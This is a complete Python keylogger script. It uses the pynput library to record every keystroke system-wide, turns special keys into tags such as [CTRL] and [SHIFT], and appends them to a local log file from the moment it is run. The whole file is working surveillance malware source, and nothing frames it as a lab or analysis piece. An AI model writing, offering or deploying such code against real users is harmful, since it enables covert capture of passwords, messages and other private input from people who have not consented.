import pynput.keyboard
import os

class KeyLogger:
    def __init__(self):
        self.logger = ""
        self.shift_pressed = False
        self.log_file = self.get_log_file_name()
    
    def get_log_file_name(self):
        base_name = "log.txt"
        if not os.path.exists(base_name):
            return base_name
        
        i = 1
        while True:
            new_name = f"log{i}" + ".txt"
            if not os.path.exists(new_name):
                return new_name
            i += 1
            
    def append_to_log(self, key_strike):
        self.logger += key_strike
        with open(self.log_file, "a+", encoding="utf-8") as new_file:
            new_file.write(self.logger)

        self.logger = ""
    
    def evaluate_keys(self, key):
        try:
            if self.shift_pressed:
                Preseed_key = str(key.char).upper()
            else:
                Preseed_key = str(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                Preseed_key = " "
            elif key == pynput.keyboard.Key.enter:
                Preseed_key = "\n"
            elif key == pynput.keyboard.Key.tab:
                 Preseed_key = "\t"
            elif key == pynput.keyboard.Key.esc:
                Preseed_key = "[ESC]"
            elif key == pynput.keyboard.Key.ctrl:
                Preseed_key = "[CTRL]"
            elif key == pynput.keyboard.Key.shift or key == pynput.keyboard.Key.shift_r:
                Preseed_key = "[SHIFT]"
            elif key == pynput.keyboard.Key.caps_lock:
                self.shift_pressed = True
                Preseed_key = ""
            elif key == pynput.keyboard.Key.alt:
                Preseed_key = "[ALT]"
            elif key == pynput.keyboard.Key.backspace:
                if self.logger:
                    self.logger = self.logger[:-1]
                Preseed_key = ""
            elif key == pynput.keyboard.Key.delete:
                Preseed_key = "[DELETE]"
            elif key == pynput.keyboard.Key.left:
                Preseed_key = "[LEFT ARROW]"
            elif key == pynput.keyboard.Key.right:
                Preseed_key = "[RIGHT ARROW]"
            elif key == pynput.keyboard.Key.up:
                Preseed_key = "[UP ARROW]"
            elif key == pynput.keyboard.Key.down:
                Preseed_key = "[DOWN ARROW]"
            else:
                Preseed_key = " " + str(key) + " "
        
        self.append_to_log(Preseed_key)
    
    def on_release(self, key):
        if key == pynput.keyboard.Key.shift:
            self.shift_pressed = False

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys, on_release=self.on_release)
        with keyboard_listener:
            self.logger = ""
            keyboard_listener.join()

KeyLogger().start()

